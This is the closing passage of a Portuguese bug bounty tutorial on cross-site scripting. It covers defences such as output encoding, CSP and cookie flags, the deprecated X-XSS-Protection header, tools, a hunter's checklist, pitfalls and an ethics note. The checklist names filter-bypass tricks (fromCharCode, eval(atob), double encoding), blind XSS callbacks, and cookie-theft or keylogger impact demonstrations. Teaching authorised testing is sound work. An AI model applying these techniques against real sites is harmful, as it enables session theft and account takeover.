`HttpOnly` impede o JS de ler o cookie (mata o roubo via `document.cookie`); `SameSite` corta o vetor de CSRF que o XSS poderia encadear; `Secure` exige HTTPS.

> ❌ **O que NÃO basta:** filtro de blacklist ("removo a palavra script") — *case mixing* e `fromCharCode` furam fácil; escapar só `<` e `>` e esquecer aspas (mata o contexto corpo, deixa o de atributo); confiar **só** no WAF; confiar **só** no CSP sem encoding; e **"validar/limitar o input" como defesa principal** — o mesmo dado é seguro num contexto e perigoso em outro, e dado legítimo tem caractere especial (o nome `O'Brien` tem aspa): a defesa primária de XSS é **encoding na saída**, não validação na entrada (validar input é reforço, [diz o OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)). Defesa de XSS é **camada sobre camada**.

> ⚠️ **Não conte com o header `X-XSS-Protection` — ele está DEPRECADO.** Ele controlava o "XSS Auditor" do navegador, que **já foi removido** dos navegadores modernos (o Chrome removeu na **v78**, em 2019; o Edge aposentou ao migrar pro Chromium; o Firefox **nunca implementou**). A [MDN é explícita](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-XSS-Protection): use **Content-Security-Policy no lugar**, porque o próprio Auditor era **abusável** — como o atacante controla a request, dava pra enganá-lo a **bloquear um `<script>` legítimo** da página (neutralizando uma checagem de segurança e empurrando a app pra um caminho inseguro), além de servir de oráculo pra vazar se uma string existe na página. Em certos casos ele **criava** brechas em sites que seriam seguros. Se você vir um programa ostentando `X-XSS-Protection: 1; mode=block` como "proteção contra XSS", isso **não é defesa real** em 2026 — a defesa é encoding + CSP. (O [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/) recomenda enviar no máximo `X-XSS-Protection: 0`, justamente pra desligar o comportamento legado.)

> 🔗 **Quer essas "defesas que não defendem" dissecadas?** Tem um post dedicado só a isso: proteções de XSS que parecem seguras mas falham (com o bypass de cada uma) e o que **realmente** funciona — com foco no que costuma sair de código gerado por IA: **[XSS: proteções, falhas e o que realmente funciona](/posts/xss-protecoes-e-falhas/)**.

## Ferramentas + labs legais

- **Burp Suite** — Repeater (testar contexto), Intruder (fuzzar payloads), e a extensão **Burp Collaborator** pra blind XSS.
- **XSS Hunter / [xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)** — payloads de blind XSS com callback e screenshot.
- **DOM Invader** (vem no Burp) — automatiza a caça de source→sink de DOM XSS.
- **qsreplace / gau / httpx** — pipeline de descoberta de refletidos (ver [post 01 — Recon](/posts/recon-discovery/)).
- **Labs autorizados:** [PortSwigger Web Security Academy — XSS](https://portswigger.net/web-security/cross-site-scripting) (de longe a melhor fonte gratuita, com labs por contexto), [Intigriti XSS Challenges](https://challenge.intigriti.io/), DVWA, TryHackMe, HackTheBox.

## Checklist do caçador

- [ ] Mandei um **marcador único** (`xsstest9173`) e localizei **onde** ele reflete.
- [ ] Identifiquei o **contexto** (corpo HTML / atributo / dentro de `<script>` / URL-href).
- [ ] Escolhi o payload que **escapa daquele contexto** (não chutei payload genérico).
- [ ] Testei **reflected** (URL/form), **stored** (perfil, comentário, upload, e-mail) e **DOM** (sinks no JS).
- [ ] Quando filtrado, tentei **bypasses** (event handler, case, encoding/duplo, `fromCharCode`, `eval(atob)`).
- [ ] Em painéis internos/tickets, plantei **blind XSS** com callback.
- [ ] Usei `alert(document.domain)` (ou `print()` em iframe) pra provar a **origem**.
- [ ] Demonstrei **impacto real** (roubo de cookie / ação em nome / keylogger) sem mirar vítima real.
- [ ] Conferi que XSS **está no escopo** do programa.

## Pegadinhas / o que NÃO funciona

> 💡 **SSTI / CSTI**: Server-Side / Client-Side Template Injection — injeção no motor de templates (servidor/cliente). Resultado parecido com XSS, mecanismo diferente.
{: .prompt-tip }

- **`alert` não dispara, mas o código executa:** pode ser iframe cross-origin (Chrome 92+ bloqueia `alert`). Troque por `print()` ou `console.log`/`fetch` pra confirmar.
- **HTML Injection ≠ XSS:** se só o `<b>` renderiza mas `<script>`/handlers são escapados, você tem HTML Injection (impacto menor), não XSS. Reporte como o que é.
- **`{{7*7}}` virando `49` não é XSS:** isso é **template injection** (SSTI/CSTI), outra classe. E se a app **quebra** e despeja dados de outros clientes, é **exposição de dados sensíveis** — classifique certo.
- **Cookie `HttpOnly` não anula o bug:** XSS continua crítico (ações em nome da vítima, keylogger).
- **"Funciona no meu navegador":** auto-XSS (você cola payload no seu próprio DevTools/console) **não é vulnerabilidade** — não há vetor pra atingir outra pessoa.
- **`X-XSS-Protection` não protege mais nada:** o header está **deprecado** e o XSS Auditor que ele controlava foi **removido** dos navegadores. Ver ele presente num alvo **não** significa que o XSS está mitigado — ignore e teste normalmente; ver ele ausente **não** é, por si só, uma vulnerabilidade reportável.

## O que você precisa lembrar

- XSS = a aplicação trata **a sua entrada como código** no navegador da vítima.
- **HTML Injection** é o degrau anterior: se interpreta HTML, o XSS está logo ali.
- Três tipos: **reflected** (espelho, precisa de link), **stored** (mural, vem sozinho), **DOM** (o JS do front se atrapalha).
- O **payload muda com o contexto** — leia onde a entrada caiu antes de escolher.
- Defesa = **output encoding por contexto** + `textContent`/DOMPurify + CSP com nonce + cookies `HttpOnly`/`SameSite`. Camadas, não bala de prata.

> 💡 **Dica de ouro:** não decore payloads — **leia o contexto**. Mande um marcador único, ache onde ele reflete (corpo? atributo? script?) e **como** (cru ou escapado), e só então monte o payload que escapa *daquele* lugar. É a diferença entre "colei um `<script>` e não funcionou" e **provar** XSS em qualquer aplicação.

## Nota ética

Tudo aqui é pra **testes autorizados** — bug bounty dentro do escopo, pentests contratados e labs legais. Rodar payload de XSS contra usuários ou sistemas de terceiros sem autorização é crime e antiético. Na PoC, **mire sempre a sua própria conta de teste**: demonstre o mecanismo (o cookie chegando no *seu* servidor), nunca exfiltre dado de gente real. Use pra proteger, reportar com responsabilidade e ensinar.

## Referências

- [OWASP A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP — Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP — DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [PortSwigger — Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting), [XSS cheat sheet (2026)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) e [Content Security Policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
- [MDN — X-XSS-Protection (deprecado; use CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-XSS-Protection) · [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [FIRST.org — CVSS v4.0 Examples (inclui reflected/stored XSS)](https://www.first.org/cvss/examples)
- [Assetnote — Finding XSS in a million websites (cPanel CVE-2023-29489)](https://www.assetnote.io/resources/research/finding-xss-in-a-million-websites-cpanel-cve-2023-29489)
- [DOMPurify](https://github.com/cure53/DOMPurify) · [XSS Hunter (self-hosted)](https://github.com/mandatoryprogrammer/xsshunter-express)
- [reddelexc/hackerone-reports — Top XSS reports](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPXSS.md) (centenas de reports reais pra estudar)

---
*Próximo/relacionado na série: [Account Takeover — JWT, reset de senha e OAuth](/posts/account-takeover/) · base: [Recon & Discovery](/posts/recon-discovery/) · classe-irmã: [SQL Injection](/posts/sql-injection/)*

---

*📚 Parte do **[Guia Completo de Bug Bounty](/posts/guia-bug-bounty/)** — o índice da série, do básico ao avançado.*
{% endraw %}
